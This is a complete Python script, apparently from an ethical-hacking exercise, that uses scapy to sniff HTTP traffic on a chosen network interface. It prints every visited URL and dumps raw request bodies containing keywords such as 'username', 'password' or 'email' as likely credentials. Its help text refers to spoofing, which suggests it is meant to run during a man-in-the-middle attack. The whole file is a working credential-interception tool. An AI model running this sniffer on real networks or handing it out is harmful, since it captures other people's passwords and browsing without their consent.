#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "email", "mail"]
        for element in keywords:
            if element in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Visited URL : " + url)
        load = get_login_info(packet)
        if load:
            print("\n\n[+] Possible Username/Password combination : " + load + "\n\n--------------------------")


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="[+] Specify the interface for spoofing")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please Specify an interface, check --help for more details")
    else:
        return options


options = get_arguments()
sniff(options.interface)